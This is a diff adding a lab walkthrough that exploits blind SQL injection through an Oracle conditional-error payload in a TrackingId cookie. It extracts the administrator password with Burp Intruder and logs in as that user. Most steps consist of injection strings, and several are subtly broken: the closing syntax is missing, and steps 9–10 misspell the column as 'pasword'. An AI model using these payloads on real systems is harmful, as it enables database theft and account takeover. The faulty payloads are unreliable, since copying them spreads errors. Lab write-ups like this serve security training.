@@ -1,0 +1,22 @@
+Lab 12: Blind SQL injection with conditional errors
+
+Details:  This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
+The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.
+The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+
+To Do: To solve the lab, log in as the administrator user.
+
+Solution:
+	1. Use Burp Suite to intercept the request which contain TrackingId cookie.
+    	2. Send the request to the repeter (ctrl+r) [it's easy to modify the request and view the result in the repeter]. You can do that in default "intercept" tab under "Proxy". It's totally optional.
+    	3. Now add "' AND '1'='1" after the TrackingID cookie. Now verify that its a valid request by 200 OK apears in the response.
+	4. Now add "' AND (SELECT CASE WHEN (1=1) THEN '1' ELSE to_char(1/0) END FROM dual" after the TrackingID cookie(Its a oracle database. That's why 'dual'). Now verify that its a valid request by 200 OK apears in the response. Here, (1/0) is the conditional error. It is used to differentiate true and false condition.
+	5. Now add "' AND (SELECT CASE WHEN (1=1) THEN '1' ELSE to_char(1/0) END FROM users WHERE ROWNUM=1" after the TrackingID cookie. Now verify that its a valid request by 200 OK apears in the response. Which also verifies that there is a 'users' table in the database.
+	6. Now add "' AND (SELECT CASE WHEN (1=1) THEN '1' ELSE to_char(1/0) END FROM users WHERE username='administrator'" after the TrackingID cookie. Now verify that its a valid request by 200 OK apears in the response. Which also verifies that there is a user named administrator in the 'users' table in the database.
+	7. Now add "' AND (SELECT CASE WHEN (LENGTH(password)>1) THEN '1' ELSE to_char(1/0) END FROM users WHERE username='administrator'" after the TrackingID cookie. Now verify that its a valid request by 200 OK apears in the response. Which also verifies that password of the administrator is grater than 1. Now send it to the intruder.
+	8. Use sniper attach on length of the password using number payload. "' AND (SELECT CASE WHEN (LENGTH(password)=$1$) THEN '1' ELSE to_char(1/0) END FROM users WHERE username='administrator'" ---> $1$. A 200 OK response wiil tell you the length of the password.
+	9. Now add "' AND (SELECT CASE WHEN (SUBSTR(pasword,1,1)<'a') THEN '1' ELSE to_char(1/0) END FROM users WHERE username='administrator'" after the TrackingID cookie. Now verify that its a valid request by 200 OK apears in the response. if not use '>=' sign before after the SUBSTR() and verify if it is a valid request. Which verify the sql is correct. Now send it to the intruder.
+	10. use sniper attack on the SUBSTR() using bruteforce payload. "' AND (SELECT CASE WHEN (SUBSTR(pasword,1,1)='a') THEN '1' ELSE to_char(1/0) END FROM users WHERE username='administrator'" --> '$a$'. For a valid request you will get the 200 OK response in the intruder. In that valid request the veriable value $a$ in that sql is the character of the administrator password on the position 1 of SUBSTR() function. Now menually change the position of the SUBSTR() function and run the attact till the length of the passwod.
+	11. In your browser, click "My account" to open the login page. Use the password to log in as the administrator user.
+
+Note: We could create a single Intruder attack with two payload positions and the "Cluster bomb" attack type and work through all permutations of offsets and character values while guessing the passord. 
